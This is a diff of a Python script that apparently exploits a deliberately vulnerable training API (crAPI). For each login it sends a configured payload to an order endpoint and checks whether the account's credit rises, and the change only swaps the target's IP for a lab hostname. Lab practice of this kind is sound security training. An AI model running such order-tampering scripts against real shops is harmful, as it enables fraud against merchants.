@@ -34,7 +34,7 @@ for login in config["logins"]:
     credit = response_data.get("credit")
     print("order id is:", order_id, "\nCurrent credit is: ", credit)
     response = requests.put(config["target_url"] + f"/{order_id}", json=config["payload"], headers=headers)
-    response = requests.get("http://34.76.82.192:8888/workshop/api/shop/products", headers=headers)
+    response = requests.get("http://crapi.bobaklabs.com:8888/workshop/api/shop/products", headers=headers)
     response_data = response.json()
     credit = response_data.get("credit")
     print("Credit after payload is: ", credit)
